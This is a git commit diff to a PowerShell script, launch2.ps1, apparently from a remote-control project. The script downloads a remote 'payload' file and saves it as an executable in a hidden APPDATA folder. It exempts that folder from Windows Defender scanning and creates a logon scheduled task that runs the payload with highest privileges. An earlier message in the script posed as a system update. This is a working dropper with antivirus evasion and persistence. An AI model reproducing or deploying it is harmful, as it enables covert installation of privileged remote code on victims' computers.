1c65278d1627e9e7f09f0d3e9e1460021ef10aec
PowerPizza <102456330+PowerPizza@users.noreply.github.com>
2026-05-23 09:38:25 +0530

    Enhanced over the internet - launch2 script

--- launch2.ps1
+++ launch2.ps1
@@ -9,19 +9,23 @@ $hidden_path = $env:APPDATA + "\$dummy_name_no_exe"
 $dummy_name = "$dummy_name_no_exe.exe"
 #$cwd_path = Split-Path -Path $PSCommandPath -Parent -Resolve
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerPizza/Wireless-ALT-F4-public/master/payload.txt" -OutFile "$env:USERPROFILE\payload.txt"
-
 if (!(Test-Path "$hidden_path")){
     mkdir "$hidden_path"
 }
 else{
-    Write-Output "System is already updated!"
+    Write-Output "[19882] EXISTS ERROR!"
     Write-Output "[Press enter to exit]"
     pause
     exit
 }
 
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerPizza/Wireless-ALT-F4-public/master/payload.txt" -OutFile "$env:USERPROFILE\payload.txt"
+
+if ((Get-MpPreference).ExclusionPath -contains "$hidden_path") {
+    Remove-MpPreference -ExclusionPath "$hidden_path"
+}
 Add-MpPreference -ExclusionPath "$hidden_path"
+
 Copy-Item "$env:USERPROFILE\payload.txt" -Destination "$hidden_path\$dummy_name"
 schtasks /create /tn "$dummy_name_no_exe" /tr "$hidden_path\$dummy_name" /sc onlogon /rl HIGHEST /f
 Remove-Item "$env:USERPROFILE\payload.txt"
